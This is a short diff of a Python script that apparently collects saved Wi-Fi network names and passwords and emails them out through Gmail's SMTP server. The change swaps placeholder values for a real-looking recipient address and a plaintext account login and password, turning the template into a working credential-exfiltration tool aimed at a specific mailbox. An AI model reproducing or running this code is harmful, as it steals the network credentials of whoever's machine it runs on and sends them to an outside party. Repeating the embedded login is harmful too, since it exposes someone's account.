@@ -53,9 +53,9 @@ for item in wifi_list:
 # Create EmailMessage Object
 email = EmailMessage()
 # Who is the email from
-email["from"] = "name_of_sender"
+email["from"] = "voodoo"
 # To which email you want to send the email
-email["to"] = "email_address"
+email["to"] = "a847b847@gmail.com"
 # Subject of the email
 email["subject"] = "WiFi SSIDs and Passwords"
 email.set_content(email_message)
@@ -66,6 +66,6 @@ with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
     # Connect securely to server
     smtp.starttls()
     # Login using username and password to dummy email. Remember to set email to allow less secure apps if using Gmail
-    smtp.login("login_name", "password")
+    smtp.login("a847b847", "H2OKynsa29*")
     # Send email.
     smtp.send_message(email)
